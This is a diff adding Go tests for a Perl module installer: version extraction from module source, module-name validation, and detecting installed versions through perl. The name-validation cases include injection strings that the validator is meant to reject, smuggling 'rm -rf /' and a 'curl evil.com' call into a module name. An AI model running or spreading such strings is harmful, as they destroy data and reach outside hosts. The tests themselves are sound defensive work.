@@ -6,6 +6,8 @@ package modules
 import (
 	"context"
 	"os"
+	"os/exec"
+	"strings"
 	"testing"
 
 	"tamarou.com/pvm/internal/cli/progress"
@@ -333,4 +335,329 @@ func TestInstaller_ConvertInstallOptions(t *testing.T) {
 	if !pviOpts.Cleanup { // Note: Cleanup is always set to true in convertInstallOptions
 		t.Errorf("Expected Cleanup true, got %t", pviOpts.Cleanup)
 	}
+}
+
+// createTestInstaller creates an installer instance for testing
+func createTestInstaller() *Installer {
+	provider := &mockProvider{}
+	resolver := deps.NewDependencyResolver()
+	tracker := &mockTracker{}
+	logger := log.NewLogger(log.LevelInfo, os.Stderr, "test")
+	return NewInstaller(provider, resolver, tracker, logger)
+}
+
+// TestExtractVersionFromContent tests version extraction from Perl module content
+func TestExtractVersionFromContent(t *testing.T) {
+	installer := createTestInstaller()
+
+	tests := []struct {
+		name     string
+		content  string
+		expected string
+		hasError bool
+	}{
+		{
+			name:     "quoted version",
+			content:  `our $VERSION = "1.23";`,
+			expected: "1.23",
+			hasError: false,
+		},
+		{
+			name:     "single quoted version",
+			content:  `our $VERSION = '2.45';`,
+			expected: "2.45",
+			hasError: false,
+		},
+		{
+			name:     "unquoted numeric version",
+			content:  `our $VERSION = 3.14;`,
+			expected: "3.14",
+			hasError: false,
+		},
+		{
+			name:     "version->declare usage",
+			content:  `our $VERSION = version->declare("v1.2.3");`,
+			expected: "v1.2.3",
+			hasError: false,
+		},
+		{
+			name:     "version->parse usage",
+			content:  `our $VERSION = version->parse("4.56");`,
+			expected: "4.56",
+			hasError: false,
+		},
+		{
+			name:     "multiline with indentation",
+			content:  "package MyModule;\n\nour $VERSION = \"0.42\";\n\nsub new {\n",
+			expected: "0.42",
+			hasError: false,
+		},
+		{
+			name:     "no version found",
+			content:  `package MyModule;\nsub new { return bless {}, shift; }`,
+			expected: "",
+			hasError: true,
+		},
+		{
+			name:     "without our keyword",
+			content:  `$VERSION = "1.0";`,
+			expected: "1.0",
+			hasError: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result, err := installer.extractVersionFromContent(tt.content)
+
+			if tt.hasError && err == nil {
+				t.Errorf("Expected error but got none")
+			}
+			if !tt.hasError && err != nil {
+				t.Errorf("Unexpected error: %v", err)
+			}
+			if result != tt.expected {
+				t.Errorf("Expected version %q, got %q", tt.expected, result)
+			}
+		})
+	}
+}
+
+// TestValidateModuleName tests module name validation for security
+func TestValidateModuleName(t *testing.T) {
+	installer := createTestInstaller()
+
+	tests := []struct {
+		name     string
+		module   string
+		hasError bool
+	}{
+		{
+			name:     "valid simple module",
+			module:   "DBI",
+			hasError: false,
+		},
+		{
+			name:     "valid namespaced module",
+			module:   "DBD::mysql",
+			hasError: false,
+		},
+		{
+			name:     "valid complex namespace",
+			module:   "Some::Deep::Module::Name",
+			hasError: false,
+		},
+		{
+			name:     "valid underscore module",
+			module:   "Test_Module",
+			hasError: false,
+		},
+		{
+			name:     "empty module name",
+			module:   "",
+			hasError: true,
+		},
+		{
+			name:     "module with semicolon injection",
+			module:   "DBI; system('rm -rf /'); #",
+			hasError: true,
+		},
+		{
+			name:     "module with eval injection",
+			module:   "DBI} eval{system('curl evil.com')} #",
+			hasError: true,
+		},
+		{
+			name:     "module with backticks",
+			module:   "DBI`rm -rf /`",
+			hasError: true,
+		},
+		{
+			name:     "module with dollar signs",
+			module:   "DBI$VERSION",
+			hasError: true,
+		},
+		{
+			name:     "module starting with number",
+			module:   "123Module",
+			hasError: true,
+		},
+		{
+			name:     "module with spaces",
+			module:   "My Module",
+			hasError: true,
+		},
+		{
+			name:     "module with dots",
+			module:   "My.Module",
+			hasError: true,
+		},
+		{
+			name:     "very long module name",
+			module:   strings.Repeat("A", 300),
+			hasError: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := installer.validateModuleName(tt.module)
+
+			if tt.hasError && err == nil {
+				t.Errorf("Expected validation error for module %q but got none", tt.module)
+			}
+			if !tt.hasError && err != nil {
+				t.Errorf("Unexpected validation error for module %q: %v", tt.module, err)
+			}
+		})
+	}
+}
+
+// TestGetVersionFromPerl tests Perl command execution for version detection
+func TestGetVersionFromPerl(t *testing.T) {
+	installer := createTestInstaller()
+
+	// Skip if perl is not available in system
+	if _, err := exec.LookPath("perl"); err != nil {
+		t.Skip("Perl not found in PATH, skipping Perl execution tests")
+	}
+
+	tests := []struct {
+		name     string
+		module   string
+		hasError bool
+		skipTest bool
+	}{
+		{
+			name:     "strict module (should be available in most Perl installations)",
+			module:   "strict",
+			hasError: false,
+			skipTest: false,
+		},
+		{
+			name:     "nonexistent module",
+			module:   "NonExistentModule12345",
+			hasError: true,
+			skipTest: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if tt.skipTest {
+				t.Skip("Skipping test that requires specific module")
+			}
+
+			result, err := installer.getVersionFromPerl(tt.module, "perl")
+
+			if tt.hasError && err == nil {
+				t.Errorf("Expected error but got none for module %s", tt.module)
+			}
+			if !tt.hasError && err != nil {
+				// For core modules that might not have versions, this is acceptable
+				if !strings.Contains(err.Error(), "has no version") {
+					t.Errorf("Unexpected error for module %s: %v", tt.module, err)
+				}
+			}
+
+			// If we got a result, it should be a reasonable version string
+			if result != "" && !tt.hasError {
+				// Version should not be empty or "undef"
+				if result == "undef" {
+					t.Errorf("Got 'undef' as version for module %s", tt.module)
+				}
+				t.Logf("Module %s version: %s", tt.module, result)
+			}
+		})
+	}
+}
+
+// TestGetInstalledVersion tests the main version detection method
+func TestGetInstalledVersion(t *testing.T) {
+	installer := createTestInstaller()
+
+	// Skip if perl is not available in system
+	if _, err := exec.LookPath("perl"); err != nil {
+		t.Skip("Perl not found in PATH, skipping version detection tests")
+	}
+
+	tests := []struct {
+		name     string
+		module   string
+		perlPath string
+		skipTest bool
+	}{
+		{
+			name:     "strict module with default perl",
+			module:   "strict",
+			perlPath: "",
+			skipTest: false,
+		},
+		{
+			name:     "nonexistent module should return undef",
+			module:   "NonExistentModule12345",
+			perlPath: "",
+			skipTest: false,
+		},
+		{
+			name:     "strict module with explicit perl path",
+			module:   "strict",
+			perlPath: "perl",
+			skipTest: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if tt.skipTest {
+				t.Skip("Skipping test that requires specific setup")
+			}
+
+			result, err := installer.getInstalledVersion(tt.module, tt.perlPath)
+
+			// The main method should never error - it should return "undef" for unknown versions
+			if err != nil {
+				t.Errorf("getInstalledVersion should not return errors, got: %v", err)
+			}
+
+			// Result should be either a version string or "undef"
+			if result != "undef" && result != "" {
+				// Should look like a version (contain digits and possibly dots)
+				if !strings.ContainsAny(result, "0123456789") {
+					t.Errorf("Version %q doesn't look like a valid version", result)
+				}
+				t.Logf("Module %s version: %s", tt.module, result)
+			} else if result == "undef" {
+				t.Logf("Module %s has no version (returned 'undef')", tt.module)
+			}
+		})
+	}
+}
+
+// TestVersionDetectionIntegration tests version detection integration
+func TestVersionDetectionIntegration(t *testing.T) {
+	// Test that the main getInstalledVersion method works with a real installer
+	installer := createTestInstaller()
+
+	// Skip if perl is not available
+	if _, err := exec.LookPath("perl"); err != nil {
+		t.Skip("Perl not found in PATH, skipping integration test")
+	}
+
+	t.Run("version detection integration", func(t *testing.T) {
+		// Test with a core module that should be available
+		result, err := installer.getInstalledVersion("strict", "perl")
+
+		// The main method should never error - it should return "undef" for unknown versions
+		if err != nil {
+			t.Errorf("getInstalledVersion should not return errors, got: %v", err)
+		}
+
+		// Result should be either a version string or "undef"
+		if result != "undef" && result != "" {
+			t.Logf("Module strict version: %s", result)
+		} else if result == "undef" {
+			t.Logf("Module strict has no version (returned 'undef')")
+		}
+	})
 }
